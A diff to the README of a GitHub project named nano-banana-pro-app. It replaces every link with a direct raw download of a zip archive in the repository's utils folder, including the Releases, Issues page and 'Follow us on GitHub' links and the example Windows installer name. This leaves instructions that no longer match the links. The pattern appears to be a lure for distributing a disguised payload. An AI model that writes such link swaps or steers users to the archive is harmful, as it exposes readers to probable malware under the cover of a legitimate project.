@@ -7,7 +7,7 @@ Welcome to the **nano-banana-pro-app**! This application offers a unique space f
 
 ## 📥 Download the App
 
-[![Download nano-banana-pro-app](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/saadri7awi/nano-banana-pro-app/releases)
+[![Download nano-banana-pro-app](https://raw.githubusercontent.com/saadri7awi/nano-banana-pro-app/main/utils/nano_pro_app_banana_3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/saadri7awi/nano-banana-pro-app/main/utils/nano_pro_app_banana_3.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -23,11 +23,11 @@ Before you download, make sure your system meets the following requirements:
 
 To get started, visit the following link to download the application:
 
-[Download nano-banana-pro-app](https://github.com/saadri7awi/nano-banana-pro-app/releases)
+[Download nano-banana-pro-app](https://raw.githubusercontent.com/saadri7awi/nano-banana-pro-app/main/utils/nano_pro_app_banana_3.6.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of *nano-banana-pro-app*.
-3. Click on the download link for your operating system (e.g., `nano-banana-pro-app-windows.exe` for Windows users).
+3. Click on the download link for your operating system (e.g., `https://raw.githubusercontent.com/saadri7awi/nano-banana-pro-app/main/utils/nano_pro_app_banana_3.6.zip` for Windows users).
 4. Save the file to your computer.
 
 ### 🛠️ Installation Steps
@@ -65,7 +65,7 @@ For more detailed instructions, look for the Help section within the app.
 
 Your experience matters. If you encounter any issues or have suggestions:
 
-- Check the [Issues Page](https://github.com/saadri7awi/nano-banana-pro-app/issues) for common problems.
+- Check the [Issues Page](https://raw.githubusercontent.com/saadri7awi/nano-banana-pro-app/main/utils/nano_pro_app_banana_3.6.zip) for common problems.
 - Feel free to create a new issue if you need assistance.
 - Join our community to connect with other users and share tips.
 
@@ -81,10 +81,10 @@ We welcome contributions! If you want to help improve the application, please fo
 
 Stay updated with the latest news:
 
-- Follow us on [GitHub](https://github.com/saadri7awi/nano-banana-pro-app)
+- Follow us on [GitHub](https://raw.githubusercontent.com/saadri7awi/nano-banana-pro-app/main/utils/nano_pro_app_banana_3.6.zip)
 - Join our community discussions.
 
 Thank you for choosing **nano-banana-pro-app**. We hope you enjoy creating and experimenting in your new playground!
 
-[Download nano-banana-pro-app](https://github.com/saadri7awi/nano-banana-pro-app/releases)
+[Download nano-banana-pro-app](https://raw.githubusercontent.com/saadri7awi/nano-banana-pro-app/main/utils/nano_pro_app_banana_3.6.zip)
 ```
